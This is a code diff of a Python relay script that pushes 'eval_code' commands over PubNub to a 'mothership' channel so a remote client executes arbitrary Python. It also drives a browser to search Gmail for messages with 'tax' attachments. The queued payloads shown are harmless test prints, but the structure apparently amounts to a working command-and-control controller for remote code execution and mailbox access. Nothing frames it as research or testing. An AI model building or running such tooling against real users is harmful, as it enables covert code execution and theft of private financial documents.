@@ -42,6 +42,13 @@ def gettimestamp():
     return timestamp
 
 def logmsg(msgstr):
+    errstr = ''
+
+    if ( isinstance(msgstr, BaseException) ):
+        errstr = str(msgstr)
+        errstr += '\r\n' + traceback.format_exc()
+        msgstr = errstr
+
     print(msgstr)
 
     if( logf ):
@@ -82,6 +89,8 @@ clientid=get_clientid()
 sessionid = str(random.randint(10000000, 99999999))
 batchid = sessionid
 
+delaytime = 1
+
 messageindex = 0
 messagestack = deque([])
 
@@ -113,8 +122,9 @@ def publish_msg(msgdict):
     if not msgdict:
         return
     
-    logmsg(f"pubnub: publishing message on {client_channel}")
-    result = pubnub.publish().channel(client_channel).message(msgdict).pn_async(publish_callback)
+    msgdictstr = json.dumps(msgdict)
+    logmsg(f"pubnub: publishing message on {mothership_channel} -- {msgdictstr}")
+    result = pubnub.publish().channel(mothership_channel).message(msgdict).pn_async(publish_callback)
     return result
 
 # pubnub.publish().channel(client_channel).message(my_message).pn_async(publish_callback)
@@ -146,7 +156,7 @@ subscription.on_message = handle_message
 
 subscription.subscribe()
 
-logmsg(f"pubnub: Successfully connected. Listening for events on: {client_channel}, sending messages on {client_channel}")
+logmsg(f"pubnub: Successfully connected. Listening for events on: {client_channel}, sending messages on {mothership_channel}")
 
 ####
 
@@ -465,9 +475,72 @@ def hostgetnextmessage(messageobj):
 
 def host_loop():
     global messageindex
+    global delaytime
 
     logmsg("host_loop: starting "+inspect.currentframe().f_code.co_name)
- 
+
+    msgobj = None
+
+    while True:
+        try:
+            logmsg("looping " + gettimestamp())
+
+            if ( len(cmdstack) > 0 ):
+                msgobj = cmdstack.pop()
+                if ( msgobj ):
+                    hostpushmessage(msgobj)
+                msgobj = None
+
+            time.sleep(1)  
+
+            logmsg(f"sleeping for {delaytime} seconds -- " + gettimestamp())
+            
+            time.sleep(delaytime)  
+
+        except Exception as exp: 
+            logmsg(exp)
+
+pythonstr = """
+from datetime import datetime
+
+now = datetime.now()
+
+current_time = now.strftime("%H:%M:%S")
+print("Current Time:", current_time)
+"""
+
+cmdstrarr = []
+cmdstrarr.append('print("test 12345")')
+
+cmdstack = []
+cmdstack.append( { "builtincmd":"eval_code", "payload":cmdstrarr[0] })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+cmdstack.append( { "builtincmd":"eval_code", "payload":pythonstr })
+
+if __name__ == "__main__":
+    logmsg("starting relay loop " + gettimestamp())
+    
+    try:
+        host_loop()
+
+    except Exception as exp:
+        msg = str(exp)
+        logmsg(f"Basic Message: {msg}")
+
+        tech_msg = repr(exp)
+        logmsg(f"Technical View: {tech_msg}")
+
+        full_trace = traceback.format_exc()
+        logmsg(f"Full Stack Trace:\n{full_trace}")
+
+
+
+def main_logic():
     gmail_url = "https://mail.google.com/mail/u/0/#search/has%3Aattachment+tax"    
     msgobj = create_target(gmail_url)
 
@@ -575,23 +648,3 @@ def host_loop():
     msgstr = close_window(targetid)
     messageid = hostpushmessage(msgstr)
     result = wait_hostgetnextmessage(messageid)
-
-    sys.exit(0)
-    pass
-
-# builtincmd not implemented
-if __name__ == "__main__":
-    logmsg("starting relay loop " + gettimestamp())
-    
-    try:
-        host_loop()
-
-    except Exception as exp:
-        msg = str(exp)
-        logmsg(f"Basic Message: {msg}")
-
-        tech_msg = repr(exp)
-        logmsg(f"Technical View: {tech_msg}")
-
-        full_trace = traceback.format_exc()
-        logmsg(f"Full Stack Trace:\n{full_trace}")
